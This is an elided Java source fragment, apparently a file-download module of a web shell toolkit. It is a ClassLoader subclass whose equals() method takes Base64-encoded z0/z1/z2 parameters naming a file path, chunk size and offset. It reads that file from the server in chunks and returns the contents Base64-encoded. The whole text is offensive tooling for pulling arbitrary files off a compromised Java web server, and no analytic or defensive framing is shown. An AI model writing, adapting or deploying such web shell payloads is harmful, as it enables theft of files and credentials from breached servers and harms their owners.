...
public class file_download extends ClassLoader
{
    public file_download(ClassLoader objParent) { super(objParent); }
    public file_download() { super(file_download.class.getClassLoader()); }
    ...
    public boolean equals(Object objParam)
    {
        ...
        try
        {
            ...
            String szPath = new String(Base64.getDecoder().decode(mapParams.get("z0")));
            String szChunkSize = new String(Base64.getDecoder().decode(mapParams.get("z1")));
            String szOffset = new String(Base64.getDecoder().decode(mapParams.get("z2")));
            ...
            try
            {
                nChunkSize = Integer.parseInt(szChunkSize);
                nOffset = Long.parseLong(szOffset);
            }
            catch (NumberFormatException e)
            {
                fnWriteOutput(objParam, objResponse, osClient, "0|ERROR://Invalid chunk size or offset parameters.".getBytes());
                return true;
            }
            ...
            {
                fnWriteOutput(objParam, objResponse, osClient, ("0|ERROR://" + szPath + " not existed!").getBytes());
                return true;
            }
            ...
            {
                fnWriteOutput(objParam, objResponse, osClient, "2|".getBytes());
                return true;
            }
            ...
            try (RandomAccessFile raf = new RandomAccessFile(file, "r"))
            {
                ...
                int nReadSize = (int)Math.min(nChunkSize, nRemaining);
                ...
                {
                    int nRead = raf.read(abBuffer, nReadTotal, nReadSize - nReadTotal);
                    if (nRead == -1)
                        break;
                ...
                if (nReadTotal == 0)
                {
                    fnWriteOutput(objParam, objResponse, osClient, "0|ERROR://Read failed or empty data".getBytes());
                    return true;
                }
                ...
                if (nReadTotal < nReadSize)
                {
                    ...
                    System.arraycopy(abBuffer, 0, abActualData, 0, nReadTotal);
                }

                String szb64Data = Base64.getEncoder().encodeToString(abActualData);
                sb.append("1|" + szb64Data);
            }
